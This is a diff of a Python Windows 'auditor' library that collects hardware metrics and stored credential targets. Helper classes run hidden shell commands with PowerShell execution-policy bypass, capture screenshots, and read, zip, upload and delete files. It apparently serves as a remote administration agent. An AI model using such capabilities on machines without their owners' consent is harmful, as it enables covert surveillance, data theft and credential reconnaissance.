@@ -1,8 +1,10 @@
-# --- windows_auditor_library.py ---
+# --- library.py (Optimized Windows Auditor with Multi-Tier Fallbacks) ---
 
 import os
 import re
+import sys
 import json
+import uuid
 import shutil
 import sqlite3
 import getpass
@@ -14,6 +16,7 @@ import subprocess
 import time
 import hashlib
 import base64
+import tempfile
 from datetime import datetime, timedelta
 from typing import Dict, Any, List, Optional, Union
 
@@ -25,9 +28,8 @@ try:
 except ImportError:
     HAS_CRYPTO = False
 
-# --- Added for self-containment of inner classes ---
 import socket
-import requests 
+import requests
 
 # --- Conditional Import for pywin32 ---
 try:
@@ -38,72 +40,108 @@ except ImportError:
     PYWIN32_AVAILABLE = False
     PyWinError = type('PyWinError', (Exception,), {})
 
-# --- Shared Helper Functions ---
+if platform.system() == "Windows":
+    import ctypes
+    from ctypes import wintypes
+else:
+    ctypes = None
+    wintypes = None
 
-def _run_powershell(command: str, use_bypass: bool = False) -> Any:
+# --- Helper Functions & Registry Utilities ---
+
+def _read_reg_val(hkey, subkey: str, val_name: str, wow64_64: bool = True) -> Optional[Any]:
+    """Đọc an toàn một giá trị Registry trên Windows."""
+    if platform.system() != "Windows":
+        return None
+    try:
+        flags = winreg.KEY_READ
+        if wow64_64:
+            flags |= winreg.KEY_WOW64_64KEY
+        with winreg.OpenKey(hkey, subkey, 0, flags) as k:
+            val, _ = winreg.QueryValueEx(k, val_name)
+            return val
+    except Exception:
+        return None
+
+def _run_powershell(command: str, use_bypass: bool = True, timeout: int = 25) -> Any:
+    """
+    Thực thi PowerShell an toàn trên cả Win 7 (PS 2.0/3.0) đến Win 11 (PS 5.1/7.x):
+    - Ép mã hóa UTF-8 ở console đầu ra để không bị vỡ font tiếng Việt.
+    - Tạo cờ CREATE_NO_WINDOW để không hiện popup CMD/Console.
+    - Timeout bảo vệ chống treo vĩnh viễn.
+    """
     flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
     ps_command_list = ["powershell", "-NoProfile"]
     if use_bypass:
         ps_command_list.extend(["-ExecutionPolicy", "Bypass"])
-    ps_command_list.extend(["-Command", command])
+    
+    # Ép console output UTF-8 ngay trong phiên PowerShell
+    wrapped_command = f"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; {command}"
+    ps_command_list.extend(["-Command", wrapped_command])
     
     try:
         process = subprocess.run(
-            ps_command_list, capture_output=True, check=True, creationflags=flags
+            ps_command_list, capture_output=True, timeout=timeout, creationflags=flags
         )
-        # Giải mã thủ công để tránh lỗi khi PowerShell trả về byte không hợp lệ
         stdout_bytes = process.stdout
         try:
             json_output = stdout_bytes.decode('utf-8')
         except UnicodeDecodeError:
-            json_output = stdout_bytes.decode('utf-8', errors='replace')  # Thay ký tự lỗi bằng �
+            json_output = stdout_bytes.decode('utf-8', errors='replace')
 
         json_output = json_output.strip()
-        return json.loads(json_output) if json_output else []
-    except FileNotFoundError:
-        raise RuntimeError("PowerShell not found. Ensure it's installed and in your PATH.")
-    except subprocess.CalledProcessError as e:
-        raise RuntimeError(f"PowerShell command failed: {e.stderr}")
-    except json.JSONDecodeError as e:
-        raise RuntimeError(f"Failed to parse JSON from PowerShell. Error: {e}")
+        if not json_output:
+            return []
+        return json.loads(json_output)
+    except Exception:
+        return []
 
 def _parse_dotnet_json_date(date_obj: Any) -> Optional[datetime]:
+    """Parse ngày tháng định dạng /Date(1234567890)/ của .NET JSON."""
     date_str = date_obj.get('value') if isinstance(date_obj, dict) else date_obj
-    if not isinstance(date_str, str) or "/Date(" not in date_str: return None
+    if not isinstance(date_str, str) or "/Date(" not in date_str:
+        return None
     match = re.search(r'\((\d+)\)', date_str)
     if match:
         try:
             return datetime.fromtimestamp(int(match.group(1)) / 1000)
-        except (ValueError, IndexError, OverflowError): return None
+        except (ValueError, IndexError, OverflowError):
+            return None
     return None
 
+def _compat_wmi_script(cim_cmd: str, wmi_cmd: str) -> str:
+    """Tạo script PowerShell thông minh: Thử Get-CimInstance (Win 8/10/11), fallback Get-WmiObject (Win 7)."""
+    return f"""
+    if (Get-Command Get-CimInstance -ErrorAction SilentlyContinue) {{
+        {cim_cmd}
+    }} else {{
+        {wmi_cmd}
+    }}
+    """
+
+
+# --- Core WindowsAuditor Class ---
+
 class WindowsAuditor:
-    """Thư viện thu thập thông tin hệ thống Windows."""
+    """Thư viện thu thập thông tin hệ thống Windows với cơ chế Fallback Đa Tầng."""
 
     class _Crypto:
         """Cung cấp các hàm mã hóa AES-256 để bảo vệ dữ liệu nhạy cảm."""
         
         @staticmethod
         def _get_derived_key(password: str, salt: bytes):
-            # Sử dụng PBKDF2 để tạo key 32 bytes (256-bit) từ password
             return PBKDF2(password, salt, dkLen=32, count=1000)
 
         @staticmethod
         def encrypt(data_json: str, password: str) -> str:
-            """Mã hóa chuỗi JSON sang dạng Base64 (AES-256-CBC)."""
             if not HAS_CRYPTO or not password:
                 return data_json 
-            
             try:
                 salt = os.urandom(16)
                 key = WindowsAuditor._Crypto._get_derived_key(password, salt)
                 cipher = AES.new(key, AES.MODE_CBC)
-                iv = cipher.iv
-                
                 encrypted_bytes = cipher.encrypt(pad(data_json.encode('utf-8'), AES.block_size))
-                
-                # Gói tin: salt(16) + iv(16) + encrypted_data
-                combined = salt + iv + encrypted_bytes
+                combined = salt + cipher.iv + encrypted_bytes
                 return base64.b64encode(combined).decode('utf-8')
             except Exception as e:
                 print(f"[Crypto Error] Encryption failed: {e}")
@@ -111,21 +149,17 @@ class WindowsAuditor:
 
         @staticmethod
         def decrypt(encrypted_base64: str, password: str) -> str:
-            """Giải mã chuỗi Base64 về JSON gốc."""
             if not HAS_CRYPTO or not password:
                 return encrypted_base64
-            
             try:
                 combined = base64.b64decode(encrypted_base64)
-                if len(combined) < 33: return encrypted_base64
-                
+                if len(combined) < 33:
+                    return encrypted_base64
                 salt = combined[:16]
                 iv = combined[16:32]
                 encrypted_bytes = combined[32:]
-                
                 key = WindowsAuditor._Crypto._get_derived_key(password, salt)
                 cipher = AES.new(key, AES.MODE_CBC, iv)
-                
                 decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
                 return decrypted_bytes.decode('utf-8')
             except Exception as e:
@@ -136,24 +170,18 @@ class WindowsAuditor:
 
         @staticmethod
         def execute_command(command: str, shell_type: str = "cmd") -> Dict[str, Any]:
-            """Thực thi lệnh shell và trả về kết quả."""
             flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
             if shell_type == "powershell":
                 args = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command]
             else:
                 args = ["cmd", "/c", command]
-            
             try:
                 process = subprocess.Popen(
                     args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                     text=True, creationflags=flags, encoding='utf-8', errors='replace'
                 )
                 stdout, stderr = process.communicate(timeout=30)
-                return {
-                    "stdout": stdout,
-                    "stderr": stderr,
-                    "exit_code": process.returncode
-                }
+                return {"stdout": stdout, "stderr": stderr, "exit_code": process.returncode}
             except subprocess.TimeoutExpired:
                 process.kill()
                 return {"error": "Command timed out after 30 seconds."}
@@ -162,7 +190,6 @@ class WindowsAuditor:
 
         @staticmethod
         def get_process_list() -> List[Dict[str, Any]]:
-            """Lấy danh sách các tiến trình đang chạy."""
             processes = []
             for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                 try:
@@ -180,7 +207,6 @@ class WindowsAuditor:
 
         @staticmethod
         def kill_process(pid: int) -> bool:
-            """Kết thúc một tiến trình theo PID."""
             try:
                 p = psutil.Process(pid)
                 p.terminate()
@@ -190,17 +216,13 @@ class WindowsAuditor:
 
         @staticmethod
         def take_screenshot() -> Optional[str]:
-            """Chụp ảnh màn hình (tất cả màn hình nếu có) và trả về chuỗi Base64."""
             try:
                 from PIL import ImageGrab
                 import io
-                # all_screens=True giúp chụp toàn bộ các màn hình (virtual desktop) trên Windows
                 try:
                     screenshot = ImageGrab.grab(all_screens=True)
                 except Exception:
-                    # Fallback cho các bản Pillow cũ hoặc môi trường không hỗ trợ
                     screenshot = ImageGrab.grab()
-                
                 img_byte_arr = io.BytesIO()
                 screenshot.save(img_byte_arr, format='JPEG', quality=70)
                 return base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
@@ -210,11 +232,8 @@ class WindowsAuditor:
 
         @staticmethod
         def list_dir(path: str) -> Dict[str, Any]:
-            """Liệt kê danh sách file và thư mục."""
             if not path or path == "drives":
-                # Trả về danh sách ổ đĩa nếu path trống hoặc là "drives"
                 if platform.system() == "Windows":
-                    import ctypes
                     bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                     drives = []
                     for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
@@ -244,12 +263,6 @@ class WindowsAuditor:
 
         @staticmethod
         def download_file_or_folder(path: str, max_size_mb: int = 75) -> Dict[str, Any]:
-            """
-            Đọc file hoặc nén thư mục thành ZIP và trả về chuỗi Base64.
-            Hỗ trợ cả file đơn lẻ và toàn bộ thư mục.
-            """
-            import os
-            import base64
             import zipfile
             import io
 
@@ -260,14 +273,12 @@ class WindowsAuditor:
             max_bytes = max_size_mb * 1024 * 1024
 
             try:
-                # 1. Trường hợp là Thư mục -> Nén ZIP
                 if os.path.isdir(norm_path):
                     folder_name = os.path.basename(norm_path.rstrip('\\/')) or "archive"
                     zip_filename = f"{folder_name}.zip"
-
                     zip_buffer = io.BytesIO()
                     with zipfile.ZipFile(zip_buffer, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=6) as zipf:
-                        for root, dirs, files in os.walk(norm_path):
+                        for root, _, files in os.walk(norm_path):
                             for file in files:
                                 full_file_path = os.path.join(root, file)
                                 rel_path = os.path.relpath(full_file_path, norm_path)
@@ -283,47 +294,37 @@ class WindowsAuditor:
                             "success": False, 
                             "error": f"Folder zipped size ({len(zip_data) // (1024*1024)}MB) exceeds limit of {max_size_mb}MB."
                         }
-
-                    b64_data = base64.b64encode(zip_data).decode('utf-8')
                     return {
                         "success": True,
                         "filename": zip_filename,
-                        "content": b64_data,
+                        "content": base64.b64encode(zip_data).decode('utf-8'),
                         "is_zip": True,
                         "size": len(zip_data)
                     }
 
-                # 2. Trường hợp là File đơn lẻ
                 elif os.path.isfile(norm_path):
                     file_size = os.path.getsize(norm_path)
                     if file_size > max_bytes:
                         return {
-                            "success": False,
+                            "success": False, 
                             "error": f"File size ({file_size // (1024*1024)}MB) exceeds limit of {max_size_mb}MB."
                         }
-
                     with open(norm_path, 'rb') as f:
                         file_data = f.read()
-
-                    b64_data = base64.b64encode(file_data).decode('utf-8')
                     return {
                         "success": True,
                         "filename": os.path.basename(norm_path),
-                        "content": b64_data,
+                        "content": base64.b64encode(file_data).decode('utf-8'),
                         "is_zip": False,
                         "size": file_size
                     }
                 else:
                     return {"success": False, "error": "Invalid file or directory."}
-
             except Exception as e:
                 return {"success": False, "error": str(e)}
 
         @staticmethod
         def upload_file(path: str, b64_content: str) -> Dict[str, Any]:
-            """Lưu file từ chuỗi Base64 vào đường dẫn đích."""
-            import os
-            import base64
             try:
                 parent_dir = os.path.dirname(os.path.abspath(path))
                 if parent_dir and not os.path.exists(parent_dir):
@@ -337,9 +338,6 @@ class WindowsAuditor:
 
         @staticmethod
         def delete_path(path: str) -> Dict[str, Any]:
-            """Xóa file hoặc xóa toàn bộ thư mục."""
-            import os
-            import shutil
             if not path or not os.path.exists(path):
                 return {"success": False, "error": "Path not found."}
             try:
@@ -353,8 +351,6 @@ class WindowsAuditor:
 
         @staticmethod
         def create_dir(path: str) -> Dict[str, Any]:
-            """Tạo thư mục mới."""
-            import os
             try:
                 os.makedirs(path, exist_ok=True)
                 return {"success": True, "path": path}
@@ -362,9 +358,8 @@ class WindowsAuditor:
                 return {"success": False, "error": str(e)}
 
     class _Usage:
-
+        """Đo lường hiệu năng CPU, RAM, Disk, Network I/O."""
         _disk_name_cache = None
-        # Biến lưu trữ trạng thái để tính toán tốc độ I/O không dùng sleep
         _last_disk_io = {}
         _last_disk_time = 0
         _last_net_io = {}
@@ -375,8 +370,6 @@ class WindowsAuditor:
             if WindowsAuditor._Usage._disk_name_cache is not None:
                 return WindowsAuditor._Usage._disk_name_cache
 
-            print("[Metrics Helper] Caching disk model names via _DiskAudit...")
-            
             local_cache = {}
             try:
                 disk_auditor = WindowsAuditor._DiskAudit()
@@ -385,37 +378,25 @@ class WindowsAuditor:
                 for disk in physical_disks_info:
                     device_id_raw = disk.get("DeviceID")
                     model = disk.get("Model")
-                    
                     if device_id_raw and model:
-                        # Chuẩn hóa DeviceID
                         physical_name_from_audit = device_id_raw.rsplit('\\', 1)[-1]
-                        
-                        # --- CẢI TIẾN QUAN TRỌNG: Chuẩn hóa key về chữ thường ---
                         standardized_key = physical_name_from_audit.lower()
-                        
                         if model.strip():
                             local_cache[standardized_key] = model.strip()
-
             except Exception as e:
-                print(f"[Metrics Helper Error] Could not cache disk names using _DiskAudit: {e}")
+                print(f"[Metrics Helper Error] Could not cache disk names: {e}")
             
             WindowsAuditor._Usage._disk_name_cache = local_cache           
             return WindowsAuditor._Usage._disk_name_cache
 
         @staticmethod
         def get_cpu_usage():
-            # Sử dụng interval=None (non-blocking) để psutil tự động so sánh thời gian
-            # kể từ lần gọi get_cpu_usage trước đó, giúp phản ánh chính xác tải CPU
-            # trung bình trong chu kỳ realtime gửi metrics và không gây block event loop.
             return psutil.cpu_percent(interval=None)
 
         @staticmethod
         def get_ram_usage():
-            # Trên Windows, sử dụng GlobalMemoryStatusEx để lấy tỷ lệ phần trăm RAM sử dụng
-            # chính xác nhất (khớp 100% với Task Manager và hệ điều hành báo cáo).
-            if platform.system() == "Windows":
+            if platform.system() == "Windows" and ctypes:
                 try:
-                    import ctypes
                     class MEMORYSTATUSEX(ctypes.Structure):
                         _fields_ = [
                             ("dwLength", ctypes.c_ulong),
@@ -434,12 +415,10 @@ class WindowsAuditor:
                         return float(stat.dwMemoryLoad)
                 except Exception:
                     pass
-            # Fallback về psutil nếu không phải Windows hoặc gặp lỗi
             return psutil.virtual_memory().percent
         
         @staticmethod
         def get_disk_usage():
-            """Tính trung bình cộng % sử dụng của tất cả các ổ đĩa vật lý > 1GB."""
             try:
                 total_percent = 0.0
                 count = 0
@@ -452,42 +431,34 @@ class WindowsAuditor:
                             count += 1
                     except (PermissionError, OSError): continue
                 return float(total_percent / count) if count > 0 else 0.0
-            except Exception: return 0.0
+            except Exception:
+                return 0.0
 
         @staticmethod
         def get_disk_io_per_disk():
-            """
-            Trả về tốc độ đọc/ghi (bytes/s) cho TẤT CẢ các ổ đĩa vật lý,
-            sử dụng cơ chế delta-time không gây treo (no sleep).
-            """
             disk_name_map = WindowsAuditor._Usage._get_disk_model_map()
-            current_io = psutil.disk_io_counters(perdisk=True)
+            current_io = psutil.disk_io_counters(perdisk=True) or {}
             current_time = time.time()
             
             last_io = WindowsAuditor._Usage._last_disk_io
             last_time = WindowsAuditor._Usage._last_disk_time
             
-            # Cập nhật trạng thái cho lần gọi sau
             WindowsAuditor._Usage._last_disk_io = current_io
             WindowsAuditor._Usage._last_disk_time = current_time
 
             results = {}
-            
-            # Nếu là lần gọi đầu tiên, trả về 0 cho tất cả nhưng vẫn lưu state
             if not last_io:
                 return {f"DISK {i}: {disk_name_map.get(k, 'Unknown')}": {"read_bytes_per_sec": 0, "write_bytes_per_sec": 0} 
                         for i, k in enumerate(sorted(disk_name_map.keys()))}
 
             interval = current_time - last_time
-            if interval <= 0: interval = 1 # Tránh chia cho 0
+            if interval <= 0: interval = 1
 
-            sorted_keys = sorted(disk_name_map.keys(), key=lambda x: int(''.join(filter(str.isdigit, x))))
+            sorted_keys = sorted(disk_name_map.keys(), key=lambda x: int(''.join(filter(str.isdigit, x)) or 0))
             
             for i, standardized_key in enumerate(sorted_keys):
                 model_name = disk_name_map.get(standardized_key, "Unknown Model")
                 display_name = f"DISK {i}: {model_name}"
-
-                # Tìm key trong psutil
                 psutil_key = next((k for k in current_io.keys() if k.lower() == standardized_key), None)
 
                 read_bps, write_bps = 0, 0
@@ -503,9 +474,8 @@ class WindowsAuditor:
             
         @staticmethod
         def get_network_io_per_nic():
-            """Trả về lưu lượng mạng (bits/s) sử dụng cơ chế delta-time không sleep."""
             nic_stats = psutil.net_if_stats()
-            current_io = psutil.net_io_counters(pernic=True)
+            current_io = psutil.net_io_counters(pernic=True) or {}
             current_time = time.time()
 
             last_io = WindowsAuditor._Usage._last_net_io
@@ -536,416 +506,857 @@ class WindowsAuditor:
             return results
 
     class _Ip:
+        @staticmethod
         def get_local_ip():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect(("8.8.8.8", 80)) # Connect to a public DNS server
+                s.connect(("8.8.8.8", 80))
                 ip = s.getsockname()[0]
                 s.close()
                 return ip
             except Exception:
-                return "N/A"
+                return "127.0.0.1"
 
+        @staticmethod
         def get_wan_ip():
-            try:
-                response = requests.get("https://api.ipify.org", timeout=5)
-                return response.text
-            except requests.exceptions.RequestException:
-                return "N/A"
+            services = ["https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"]
+            for s in services:
+                try:
+                    res = requests.get(s, timeout=3)
+                    if res.status_code == 200 and res.text.strip():
+                        return res.text.strip()
+                except Exception:
+                    continue
+            return "N/A"
 
+    # --- 1. CPU AUDIT (Đa tầng: Registry + psutil -> CIM/WMI) ---
     class _CpuAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            try:
-                command = "Get-CimInstance -ClassName Win32_Processor | Select-Object Name, Manufacturer, Architecture, AddressWidth | ConvertTo-Json"
-                wmi_data = _run_powershell(command)
-                processor = wmi_data if isinstance(wmi_data, dict) else wmi_data[0]
-                arch_map = {0: "x86", 5: "ARM", 6: "Itanium", 9: "x86_64", 12: "ARM64"}
-                arch_string = arch_map.get(processor.get('Architecture', -1), "Unknown")
-                self._details = {
-                    "Brand": processor.get('Name', 'N/A').strip(), "Vendor": processor.get('Manufacturer', 'N/A').strip(),
-                    "Architecture": arch_string, "Bits": processor.get('AddressWidth', 'N/A'),
-                    "Physical Cores": psutil.cpu_count(logical=False), "Logical Cores": psutil.cpu_count(logical=True),
-                    "Processor": platform.processor(), "Machine": platform.machine(), "System": platform.system(),
-                    "Release": platform.release(), "Version": platform.version(), "Platform": platform.platform()
-                }
-            except Exception as e: self._details = {"Error": f"Could not retrieve CPU info: {e}"}
+            if self._details:
+                return self._details
+
+            # --- Tầng 1: Đọc Registry trực tiếp (Tức thì, không tốn tài nguyên) ---
+            brand = _read_reg_val(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString")
+            vendor = _read_reg_val(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0", "VendorIdentifier")
+            
+            machine_arch = platform.machine()
+            bits = 64 if "64" in machine_arch or sys.maxsize > 2**32 else 32
+            arch_str = "x86_64" if bits == 64 else "x86"
+            if "arm" in machine_arch.lower():
+                arch_str = "ARM64" if bits == 64 else "ARM"
+
+            res = {
+                "Brand": str(brand).strip() if brand else "Unknown CPU",
+                "Vendor": str(vendor).strip() if vendor else "Unknown Vendor",
+                "Architecture": arch_str,
+                "Bits": bits,
+                "Physical Cores": psutil.cpu_count(logical=False) or 1,
+                "Logical Cores": psutil.cpu_count(logical=True) or 1,
+                "Processor": platform.processor(),
+                "Machine": platform.machine(),
+                "System": platform.system(),
+                "Release": platform.release(),
+                "Version": platform.version(),
+                "Platform": platform.platform()
+            }
+
+            # --- Tầng 2: Nếu chưa lấy được Brand, bổ sung qua PowerShell CIM/WMI ---
+            if not brand or res["Brand"] == "Unknown CPU":
+                try:
+                    script = _compat_wmi_script(
+                        "Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, Architecture, AddressWidth | ConvertTo-Json",
+                        "Get-WmiObject Win32_Processor | Select-Object Name, Manufacturer, Architecture, AddressWidth | ConvertTo-Json"
+                    )
+                    wmi_data = _run_powershell(script)
+                    processor = wmi_data if isinstance(wmi_data, dict) else (wmi_data[0] if isinstance(wmi_data, list) and wmi_data else {})
+                    if processor.get("Name"):
+                        res["Brand"] = processor["Name"].strip()
+                    if processor.get("Manufacturer"):
+                        res["Vendor"] = processor["Manufacturer"].strip()
+                except Exception:
+                    pass
+
+            self._details = res
             return self._details
 
+    # --- 2. CREDENTIAL AUDIT ---
     class _CredentialAudit:
-        def __init__(self): self._details: Dict[str, List[Dict[str, str]]] = {}
+        def __init__(self):
+            self._details: Dict[str, List[Dict[str, str]]] = {}
+
         def _fetch_raw_credentials(self) -> List[Dict[str, str]]:
             try:
-                si = subprocess.STARTUPINFO(); si.dwFlags |= subprocess.STARTF_USESHOWWINDOW; cf = subprocess.CREATE_NO_WINDOW
+                si = subprocess.STARTUPINFO()
+                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                cf = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
                 output = subprocess.check_output("cmdkey /list", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf)
                 creds, current_cred = [], {}
                 for line in output.splitlines():
                     line = line.strip()
                     if not line:
                         if current_cred: creds.append(current_cred)
-                        current_cred = {}; continue
+                        current_cred = {}
+                        continue
                     if line.startswith("Target:"): current_cred["Target"] = line.replace("Target:", "").strip()
                     elif line.startswith("Type:"): current_cred["Type"] = line.replace("Type:", "").strip()
                     elif line.startswith("User:"): current_cred["User"] = line.replace("User:", "").strip()
                 if current_cred: creds.append(current_cred)
                 return creds
-            except subprocess.CalledProcessError: return []
-            except Exception as e: return [{"Error": str(e)}]
+            except Exception as e:
+                return []
+
         def _classify_credentials(self, raw_creds: List[Dict[str, str]]) -> Dict[str, List]:
             classified = {"Web": [], "Windows": [], "Other": []}
             WEB_KW = ('microsoftaccount', 'sso_saml', 'github', 'google', 'http', 'git:')
             WIN_KW = ('domain password', 'rdp', 'remotecontrol')
             for cred in raw_creds:
                 if "Error" in cred: classified["Other"].append(cred); continue
-                target, ctype = cred.get("Target", "").lower(), cred.get("Type", "").lower()
+                target = cred.get("Target", "").lower()
+                ctype = cred.get("Type", "").lower()
                 if any(k in target for k in WEB_KW): classified["Web"].append(cred)
                 elif ctype in WIN_KW or any(k in target for k in WIN_KW): classified["Windows"].append(cred)
                 else: classified["Other"].append(cred)
             return classified
+
         def get_details(self) -> Dict[str, List[Dict[str, str]]]:
-            if not self._details: self._details = self._classify_credentials(self._fetch_raw_credentials())
+            if not self._details:
+                self._details = self._classify_credentials(self._fetch_raw_credentials())
             return self._details
 
+    # --- 3. DISK AUDIT (Đa tầng: CIM/WMI phẳng -> psutil native) ---
     class _DiskAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            phys_script = r"""
-            Get-CimInstance -ClassName Win32_DiskDrive | ForEach-Object {
-                $d = $_; $pData = @();
-                $ps = Get-CimAssociatedInstance -InputObject $d -ResultClassName Win32_DiskPartition
-                foreach ($p in $ps) {
-                    $lData = @();
-                    $ls = Get-CimAssociatedInstance -InputObject $p -ResultClassName Win32_LogicalDisk
-                    foreach ($l in $ls) { $lData += @{ DeviceID = $l.DeviceID; VolumeName = $l.VolumeName; FileSystem = $l.FileSystem; Size = $l.Size; FreeSpace = $l.FreeSpace } }
-                    if ($lData.Count -gt 0) { $pData += @{ DeviceID = $p.DeviceID; Type = $p.Type; Size = $p.Size; LogicalDisks = $lData } }
+            if self._details:
+                return self._details
+
+            phys_disks = []
+            net_drives = []
+            logical_drives = []
+
+            # --- Tầng 1: PowerShell (Hỗ trợ cả Win 7 và Win 10/11) ---
+            ps_script = r"""
+            $ErrorActionPreference = 'SilentlyContinue'
+            $disks = if (Get-Command Get-CimInstance -EA 0) { Get-CimInstance Win32_DiskDrive } else { Get-WmiObject Win32_DiskDrive }
+            $parts = if (Get-Command Get-CimInstance -EA 0) { Get-CimInstance Win32_DiskPartition } else { Get-WmiObject Win32_DiskPartition }
+            $logicals = if (Get-Command Get-CimInstance -EA 0) { Get-CimInstance Win32_LogicalDisk } else { Get-WmiObject Win32_LogicalDisk }
+
+            # 1. Bảng tra cứu logical disk info
+            $logMap = @{}
+            foreach ($l in $logicals) {
+                if ($l.DriveType -eq 3 -or $l.DriveType -eq 4) {
+                    $logMap[$l.DeviceID] = @{
+                        DeviceID = $l.DeviceID
+                        VolumeName = if ($l.VolumeName) { $l.VolumeName } else { "" }
+                        FileSystem = if ($l.FileSystem) { $l.FileSystem } else { "" }
+                        Size = [int64]$l.Size
+                        FreeSpace = [int64]$l.FreeSpace
+                    }
                 }
-                if ($pData.Count -gt 0) { @{ DeviceID = $d.DeviceID; Model = $d.Model.Trim(); SerialNumber = $d.SerialNumber.Trim(); InterfaceType = $d.InterfaceType; MediaType = $d.MediaType; Status = $d.Status; Size = $d.Size; Partitions = $pData } }
-            } | ConvertTo-Json -Depth 10
+            }
+
+            # 2. Bảng mapping từ Partition sang Drive Letter qua Win32_LogicalDiskToPartition
+            $partToDrive = @{}
+            try {
+                $assoc = if (Get-Command Get-CimInstance -EA 0) { Get-CimInstance Win32_LogicalDiskToPartition -EA 0 } else { Get-WmiObject Win32_LogicalDiskToPartition -EA 0 }
+                foreach ($a in $assoc) {
+                    $ant = [string]$a.Antecedent
+                    $dep = [string]$a.Dependent
+                    $partId = if ($ant -match 'DeviceID\s*=\s*"([^"]+)"') { $matches[1] } else { "" }
+                    $driveId = if ($dep -match 'DeviceID\s*=\s*"([^"]+)"') { $matches[1] } else { "" }
+                    if ($partId -and $driveId) {
+                        $partToDrive[$partId] = $driveId
+                    }
+                }
+            } catch {}
+
+            # 3. Lắp ráp dữ liệu chi tiết PhysicalDisks -> Partitions -> LogicalDisks
+            $pList = @()
+            foreach ($d in $disks) {
+                $idx = $d.Index
+                $dParts = @()
+                foreach ($p in ($parts | Where-Object { $_.DiskIndex -eq $idx })) {
+                    $lData = @()
+                    $driveLetter = $partToDrive[$p.DeviceID]
+                    if ($driveLetter -and $logMap.ContainsKey($driveLetter)) {
+                        $lData += $logMap[$driveLetter]
+                    }
+                    
+                    $dParts += @{
+                        DeviceID = $p.DeviceID
+                        Type = $p.Type
+                        Size = [int64]$p.Size
+                        LogicalDisks = $lData
+                    }
+                }
+                
+                $pList += @{
+                    DeviceID = $d.DeviceID
+                    Model = if ($d.Model) { $d.Model.Trim() } else { "Generic Disk" }
+                    SerialNumber = if ($d.SerialNumber) { $d.SerialNumber.Trim() } else { "N/A" }
+                    InterfaceType = if ($d.InterfaceType) { $d.InterfaceType } else { "N/A" }
+                    MediaType = if ($d.MediaType) { $d.MediaType } else { "Fixed hard disk media" }
+                    Status = if ($d.Status) { $d.Status } else { "OK" }
+                    Size = [int64]$d.Size
+                    Partitions = $dParts
+                }
+            }
+
+            # 4. Danh sách các ổ đĩa logic và ổ mạng
+            $lList = @()
+            $nList = @()
+            foreach ($l in $logicals) {
+                if ($l.DriveType -eq 4) {
+                    $nList += @{ DeviceID = $l.DeviceID; ProviderName = $l.ProviderName }
+                } elseif ($l.DriveType -eq 3 -and $l.Size -gt 1073741824) {
+                    $lList += @{
+                        DeviceID = $l.DeviceID
+                        VolumeName = if ($l.VolumeName) { $l.VolumeName } else { "" }
+                        FileSystem = if ($l.FileSystem) { $l.FileSystem } else { "" }
+                        Size = [int64]$l.Size
+                        FreeSpace = [int64]$l.FreeSpace
+                    }
+                }
+            }
+
+            @{ PhysicalDisks = $pList; NetworkDrives = $nList; LogicalDisks = $lList } | ConvertTo-Json -Depth 6
             """
-            net_script = "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType = 4' | Select-Object DeviceID, ProviderName | ConvertTo-Json"
-            # Thêm logical_script để lấy thông tin chi tiết các ổ đĩa cố định > 1GB
-            logical_script = "Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.Size -gt 1073741824 } | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace | ConvertTo-Json"
-
             try:
-                phys_disks = _run_powershell(phys_script, use_bypass=True) or []
-                net_drives = _run_powershell(net_script) or []
-                logical_drives = _run_powershell(logical_script) or []
+                raw_data = _run_powershell(ps_script)
+                if isinstance(raw_data, dict):
+                    phys_disks = raw_data.get("PhysicalDisks") or []
+                    net_drives = raw_data.get("NetworkDrives") or []
+                    logical_drives = raw_data.get("LogicalDisks") or []
+                    if isinstance(phys_disks, dict): phys_disks = [phys_disks]
+                    if isinstance(net_drives, dict): net_drives = [net_drives]
+                    if isinstance(logical_drives, dict): logical_drives = [logical_drives]
+            except Exception:
+                pass
 
-                self._details = {
-                    "PhysicalDisks": [phys_disks] if isinstance(phys_disks, dict) else phys_disks, 
-                    "NetworkDrives": [net_drives] if isinstance(net_drives, dict) else net_drives,
-                    "LogicalDisks": [logical_drives] if isinstance(logical_drives, dict) else logical_drives
-                }
+            # --- Tầng 2: Dự phòng bằng psutil nếu PowerShell rỗng ---
+            if not logical_drives:
+                try:
+                    for part in psutil.disk_partitions(all=False):
+                        if not part.fstype: continue
+                        try:
+                            usage = psutil.disk_usage(part.mountpoint)
+                            if usage.total > 1073741824:
+                                logical_drives.append({
+                                    "DeviceID": part.device.rstrip('\\'),
+                                    "VolumeName": part.mountpoint,
+                                    "FileSystem": part.fstype,
+                                    "Size": usage.total,
+                                    "FreeSpace": usage.free
+                                })
+                        except Exception:
+                            continue
+                except Exception:
+                    pass
 
-            except Exception as e: self._details = {"Error": f"Could not retrieve disk info: {e}"}
+            if not phys_disks:
